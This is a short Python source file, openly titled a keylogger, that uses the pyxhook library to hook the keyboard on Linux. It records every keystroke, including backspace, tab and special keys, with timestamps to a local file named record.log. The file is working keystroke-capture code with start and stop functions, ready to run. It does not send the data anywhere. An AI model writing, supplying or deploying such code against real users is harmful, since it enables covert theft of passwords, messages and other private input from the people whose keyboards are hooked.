##Python Keylogger
##Edited and Developed by Joshia Rheinier P.
##Compatible with versions of Python 3 and above
##Downloaded module used: pyxhook


from . import pyxhook
import datetime
#this function is called everytime a key is pressed.
#for every key pressed, it will be recorded to a text file 
#named record.log (You can edit the name and its directory)
recordfile = "record.log"
current_system_time = datetime.datetime.now()
buffer = current_system_time.strftime("%d/%m/%Y-%H|%M|%S") + ": "

def OnKeyPress(event):
	global buffer
	recordKey = open(recordfile,"a")
	if event.Ascii==32: #32 is the ascii value of space
		buffer += " "
	elif event.Ascii >= 32 and event.Ascii <= 127:
		buffer += str(chr(event.Ascii))
	elif event.Ascii == 8:
		buffer = buffer[:-1]
	elif event.Ascii==13: #10 is the ascii value of <Return>
		buffer += "\n"
		recordKey.write(buffer)
		buffer = current_system_time.strftime("%d/%m/%Y-%H|%M|%S") + ": "
	# elif event.Ascii==96: #96 is the ascii value of the grave key (`)
	# 	hook.cancel()
	elif event.Ascii == 9:
		buffer = buffer + '\t'
	else:
		buffer += "/" + str(event.Key) + "/"
		# recordKey.write(event.Key)
	recordKey.close()


#initiate HookManager class
hook=pyxhook.HookManager()
#listen to all keys pressed
hook.KeyDown=OnKeyPress
#hook the keyboard
hook.HookKeyboard()

def start():
	#start the keylogging
	hook.start()

def stop():
	global buffer, recordfile
	recordKey = open(recordfile,"a")
	recordKey.write(buffer)
	buffer = ''
	hook.cancel()